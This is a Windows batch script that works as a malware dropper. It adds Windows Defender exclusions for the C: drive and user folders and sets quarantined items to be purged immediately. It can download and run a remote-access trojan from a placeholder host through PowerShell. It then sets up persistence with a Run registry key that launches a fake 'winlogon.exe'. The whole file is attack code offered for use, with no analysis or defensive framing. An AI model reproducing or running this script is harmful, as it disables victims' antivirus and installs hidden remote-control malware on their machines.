@echo off
set RAT=0
powershell -Command "Set-MpPreference -ExclusionPath C:\Users"
powershell -Command "Set-MpPreference -ExclusionPath C:\"
powershell -Command "Set-MpPreference -ExclusionPath C:\windows1093"
powershell -Command "Set-MpPreference -ExclusionPath C:\Program%20Flies"
powershell -Command "Set-MpPreference -QuarantinePurgeItemsAfterDelay 0"
::RAT-integration
if %RAT%==0 goto SkipRAT
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://example.com/files/RATNAME.exe', 'RATNAME.exe')"
powershell -Command "Invoke-WebRequest http://example.com/files/RATNAME.exe -OutFile RATNAME.exe"
start RATNAME.exe
:SkipRAT
mkdir windows1093
call xbat.exe
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v windows1093 /t reg_sz /d C:\windows1093\winlogon.exe
cd C:\windows1093
start winlogon.exe
